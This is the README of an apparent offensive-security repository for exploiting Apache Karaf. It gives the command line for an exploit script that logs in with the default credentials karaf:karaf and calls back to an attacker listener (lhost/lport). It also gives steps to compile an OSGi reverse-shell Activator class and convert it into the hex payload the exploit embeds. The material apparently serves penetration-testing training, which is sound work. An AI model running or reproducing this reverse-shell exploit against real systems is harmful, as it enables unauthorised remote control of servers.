# offsec-karaf-exploits

# Usage:
```bash
python exploit.py --help
```
### Example:
```bash
python exploit.py --rhost=192.168.0.133 --rport=1337 --lhost=192.168.0.100 --lport=4444 --creds=karaf:karaf
```
# Rebuild Payload
### Setup Felix Framework
1. Create the lib directory
```bash
mkdir -p ./revshell/lib
```
2. Download [Felix Framework 7.0.5](https://www.apache.org/dyn/closer.lua/felix/org.apache.felix.main.distribution-7.0.5-source-release.zip?action=download)
3. Extract the zip archive
4. Copy the `org.apache.felix.main.distribution-7.0.5/bin/felix.jar` to `./revshell/lib/felix.jar`
### Generate Activator Class
```bash
cd revshell/bundle
javac -d ../classes -cp ../lib/felix.jar com/visionspace/osgi/revshell/Activator.java
```
### Get Hex Values
Hex values make up the reverse shell in the exploit
```bash
./class_to_payload.py revshell/classes/com/visionspace/osgi/revshell/Activator.class
```
# Resources
[Felix Framework](https://felix.apache.org/documentation/downloads.html)